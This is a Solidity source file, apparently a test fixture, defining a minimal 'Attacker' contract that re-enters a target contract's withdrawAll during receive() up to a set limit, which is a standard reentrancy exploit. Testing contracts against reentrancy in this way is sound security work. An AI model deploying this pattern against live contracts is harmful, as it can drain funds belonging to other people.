// Minimal attacker that re-enters C during receive
contract Attacker {
    C public c;
    uint256 public maxReentries;
    uint256 public reentries;

    constructor(C _c) {
        c = _c;
    }

    function setMaxReentries(uint256 m) public {
        maxReentries = m;
    }

    // deposit into C
    function deposit() public payable {
        // forward deposit from this contract to C
        (bool ok, ) = address(c).call{value: msg.value}(abi.encodeWithSignature("deposit()"));
        require(ok);
    }

    // trigger withdrawAll from this contract
    function triggerWithdraw() public returns (bool) {
        // call withdrawAll as this contract
        (bool ok, ) = address(c).call(abi.encodeWithSignature("withdrawAll()"));
        return ok;
    }

    receive() external payable {
        // On receiving funds during withdrawAll, attempt reentrancy if allowed
        if (reentries < maxReentries) {
            reentries++;
            // reenter withdrawAll
            (bool ignored, ) = address(c).call(abi.encodeWithSignature("withdrawAll()"));
            // ignore result
        }
    }
}

